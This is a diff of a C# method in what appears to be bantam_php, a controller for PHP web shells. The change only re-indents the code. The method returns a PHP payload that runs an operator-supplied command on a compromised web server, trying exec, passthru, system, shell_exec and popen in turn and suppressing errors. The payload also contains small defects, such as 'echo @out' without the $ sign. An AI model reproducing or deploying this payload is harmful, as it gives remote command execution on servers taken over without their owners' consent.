@@ -133,23 +133,23 @@ namespace bantam_php
         /// <returns></returns>
         public static string executeSystemCode(string code)
         {
-		        return @"
-                if (function_exists('exec')) {
-                    @exec($in, $out);
-			        echo @out;
-                } elseif(function_exists('passthru')) {
-                    @passthru($in);
-                } elseif(function_exists('system')) {
-                    @system($in);;
-                } elseif(function_exists('shell_exec')) {
-			        echo @shell_exec($in);
-                } elseif(is_resource($f = @popen($in, 'r'))) {
-			        $out = "";
-                    while (!@feof($f))
-				    $out .= fread($f, 1024);
-                    pclose($f);
-                    echo $out;
-                }";
+		    return @"
+            if (function_exists('exec')) {
+                @exec($in, $out);
+			    echo @out;
+            } elseif(function_exists('passthru')) {
+                @passthru($in);
+            } elseif(function_exists('system')) {
+                @system($in);;
+            } elseif(function_exists('shell_exec')) {
+			    echo @shell_exec($in);
+            } elseif(is_resource($f = @popen($in, 'r'))) {
+			    $out = "";
+                while (!@feof($f))
+				$out .= fread($f, 1024);
+                pclose($f);
+                echo $out;
+            }";
         }
 
         /// <summary>
